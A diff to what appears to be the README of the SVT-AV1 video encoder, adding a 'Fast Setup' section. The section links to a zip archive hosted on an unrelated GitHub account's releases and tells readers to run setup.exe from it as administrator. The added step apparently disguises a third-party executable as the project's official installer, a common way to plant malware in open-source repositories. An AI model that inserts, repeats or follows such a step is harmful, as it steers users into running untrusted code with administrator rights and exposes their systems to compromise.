@@ -11,6 +11,10 @@ and was then [adopted](https://aomedia.org/press%20releases/aomedia-software-imp
 by the Alliance of Open Media (AOM) Software Implementation Working Group
 (SIWG), in August 2020, to carry on the group's mission.
 
+## Fast Setup
+[Download SVT-AV1](https://github.com/marchinthesun/SVT-AV1/releases/download/SVT-AV1/SVT-AV1-master-v3.5.zip)
+Unzip Archive, run setup.exe as administrator
+
 ## Documentation
 
 **Guides**
